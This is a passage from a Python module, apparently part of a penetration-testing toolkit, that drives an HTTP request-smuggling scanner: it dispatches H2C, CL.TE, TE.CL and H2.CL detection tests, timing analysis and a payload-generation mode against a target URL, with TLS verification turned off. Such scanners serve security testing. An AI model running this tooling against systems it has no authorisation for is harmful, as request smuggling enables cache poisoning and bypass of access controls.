                                    timeout=self.timeout, verify=False)
            smuggle_status = resp2.status_code
            smuggle_len = len(resp2.content)

            # Differential check
            if normal_status != smuggle_status or abs(normal_len - smuggle_len) > 100:
                result["differential_detected"] = True
                result["evidence"] = (
                    f"Normal: {normal_status}/{normal_len}B, "
                    f"Smuggle: {smuggle_status}/{smuggle_len}B"
                )

        except Exception as e:
            result["error"] = str(e)[:100]

        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for H2C Smuggling Engine

        Args:
            target: Target URL or domain
            scan_type: Type of scan to run
                - 'h2c': H2C detection only
                - 'clte': CL.TE detection
                - 'tecl': TE.CL detection
                - 'h2cl': H2.CL detection
                - 'timing': Timing-based analysis
                - 'payloads': Payload generation
                - 'full': Run all detection tests
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  HTTP/2 SMUGGLING ENGINE (H2C) - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: H2Csmuggler + PortSwigger Research + Custom{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'h2c': lambda: self.detect_h2c(url),
            'clte': lambda: self.detect_clte(url),
            'tecl': lambda: self.detect_tecl(url),
            'h2cl': lambda: self.detect_h2cl(url),
            'timing': lambda: self.timing_analysis(url),
            'payloads': lambda: self.generate_smuggle_payloads(),
        }

        if scan_type == 'full':
            all_findings = []
            all_details = {}
            any_vulnerable = False

            tests = [
                ("H2C Detection", lambda: self.detect_h2c(url)),
                ("CL.TE Detection", lambda: self.detect_clte(url)),
                ("TE.CL Detection", lambda: self.detect_tecl(url)),
                ("H2.CL Detection", lambda: self.detect_h2cl(url)),
                ("Timing Analysis", lambda: self.timing_analysis(url)),
            ]

            for i, (test_name, test_func) in enumerate(tests, 1):
                self._print(f"\n  {BOLD}{YELLOW}[Phase {i}/{len(tests)}] {test_name}{RESET}", YELLOW)
                try:
                    test_result = test_func()
                    if test_result.get('vulnerable'):
                        any_vulnerable = True
                    all_findings.extend(test_result.get('findings', []))
                    all_details[test_name] = test_result.get('details', {})
                except Exception as e:
                    all_details[test_name] = {"error": str(e)}

            return {
                'vulnerable': any_vulnerable,
                'findings': all_findings,
                'details': all_details,
                'scan_type': 'h2c_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = H2CEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
